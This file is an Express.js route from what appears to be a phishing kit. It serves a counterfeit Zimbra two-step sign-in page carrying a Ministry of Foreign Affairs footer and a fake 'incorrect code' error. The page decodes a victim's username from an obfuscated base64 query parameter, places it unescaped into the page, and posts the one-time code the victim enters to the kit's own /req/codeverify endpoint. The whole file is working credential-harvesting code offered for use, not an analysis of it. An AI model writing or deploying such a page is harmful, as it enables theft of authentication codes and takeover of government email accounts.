
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const b64 = req.query.fgjhfjhgjftrurtfgncvbdssg;
    const username = Buffer.from(b64, 'base64').toString('utf-8');


    
    if (username == null) {
        res.render('error');


    }else{
        const htmlContent = `
        <!DOCTYPE html>
        <html class="user_font_size_normal" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
            
            <title>Zimbra Web Client Sign In</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
            <meta name="apple-mobile-web-app-capable" content="yes">
            <meta name="apple-mobile-web-app-status-bar-style" content="black">
            <link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
            <link rel="SHORTCUT ICON" href="/images/favicon.ico">
        
        
        </head>
        <body onload="onLoad();">

	<div id="modifiedLogin" class="LoginScreen">
		<div class="modernCenter">
                <div class="modernContentBox">
                    <div class="logo">
                        <a href="" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
                            <span class="ImgLoginBanner"></span>
                        </a>
                    </div>				
				<form id="zLoginForm" method="post" name="loginForm" action="/req/codeverify" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="f345e682-96eb-47c4-bc51-f4a03958e135">

								
									<input type="hidden" name="zrememberme" value="">
								<div class="twoFactorTitle">Using two-step authentication</div>
                                <div class="errorMessage">
                                    The one-time code used is incorrect. Please try again.</div>
                        <div class="twoFactorForm">
                                <div>
                                    <label class="zLoginFieldLabel" for="totpcode" style="float: left;">Code</label>
                                    <input type="hidden"  name="codename" type="text"  value="${username}" >
                                   <input tabindex="0" class="zLoginFieldInput" id="totpcode" name="codeverify" type="text" value="" size="40" maxlength="1024" autocomplete="off" onkeyup="disableEnable(this)">
                                </div>
                                <div class="trustedDeviceDiv">
                                        <input id="trustedDevice" value="1" type="checkbox" name="ztrusteddevice">
                                        <label id="trustedDeviceLabel" tabindex="1" for="trustedDevice">Trust this device</label>
                                    </div>
                                <div class="verifyButtonWrapper">
                                    <div>
                                        <input id="verifyButton" class="loginButton ZLoginButton DwtButton" tabindex="2" type="submit" value="Verify">
                                    </div>
                                </div>
                        </div>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2023 Ministry of Foreign Affairs. All rights reserved.</div>
		</div>
		<div class="decor2"></div>
	</div>


</body></html>
        `;
    
        // Send the HTML content as a response
        res.send(htmlContent);


    }

  
});




module.exports =router
